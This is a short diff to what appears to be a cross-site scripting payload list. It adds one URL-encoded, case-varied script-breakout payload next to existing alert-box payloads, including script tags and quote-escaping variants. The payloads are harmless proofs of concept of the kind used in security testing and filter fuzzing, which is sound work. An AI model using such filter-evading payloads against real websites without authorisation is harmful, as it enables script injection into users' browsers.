@@ -1,4 +1,5 @@
 <script>alert("XSS")</script>
+%3E%3C/scRipt%3E%3CscRipt%3Ealert('XSSPOSED')%3C/scRipt%3E
 ";alert(1)//
 '-alert(1)-'
 "<script>alert(1)</script>
